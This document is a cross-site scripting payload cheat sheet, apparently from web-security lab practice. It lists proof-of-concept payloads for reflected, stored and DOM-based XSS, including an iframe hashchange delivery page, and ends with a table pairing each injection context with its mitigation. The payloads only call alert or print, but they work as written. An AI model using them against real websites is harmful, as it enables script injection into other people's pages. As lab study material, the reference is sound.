# XSS Payload Reference - Lab Tested

## Reflected XSS

### JavaScript String Context
```javascript
'-alert(1)-'          // Single quote string breakout
"-alert(1)-"          // Double quote string breakout
'-alert(document.domain)-'
```
**Key insight:** `'` is NOT HTML-encoded inside `<script>` tags, only in HTML context.

### HTML Attribute Context
```html
" onmouseover=alert(1) "    // Double quote attribute
' onmouseover=alert(1) '    // Single quote attribute
" autofocus onfocus=alert(1) x="  // Auto-focus
```

### Href Attribute Context
```html
javascript:alert(1)    // In <a href="..."> — bypasses double-quote encoding
```

## Stored XSS

### Comment Form Injection
```
website: javascript:alert(1)
name: <script>alert(1)</script>
comment: <script>alert(1)</script>
```

## DOM XSS

### jQuery `$()` Selector Sink (hashchange)
```
URL: https://target/#<img src=x onerror=print()>
```

**Exploit delivery via iframe:**
```html
<iframe id="f" src="https://target/"></iframe>
<script>setTimeout(function(){
  document.getElementById("f").src="https://target/#<img src=x onerror=alert(1)>";
},3000);</script>
```

**Key insight:** `iframe.src = sameURL + '#hash'` triggers `hashchange` event because browser treats same-URL hash-only change as same-document navigation. Cross-origin `w.location.hash` is BLOCKED.

### `document.write` Sink
```
"><img src=x onerror=alert(1)>
```

### `innerHTML` Sink
```javascript
<img src=x onerror=alert(1)>
```

## Context Detection Checklist

| Context | Test | Bypass |
|---------|------|--------|
| HTML body | `<script>alert(1)</script>` | Encode: `&lt;script&gt;` |
| HTML attribute (") | `" onmouseover=alert(1)` | HTML encode quotes |
| HTML attribute (') | `' onmouseover=alert(1)` | HTML encode quotes |
| JS string (') | `'-alert(1)-'` | `\` escape |
| JS string (") | `"-alert(1)-"` | `\` escape |
| href attribute | `javascript:alert(1)` | Block `javascript:` protocol |
| jQuery selector | `<img src=x onerror=alert(1)>` | Sanitize `location.hash` |
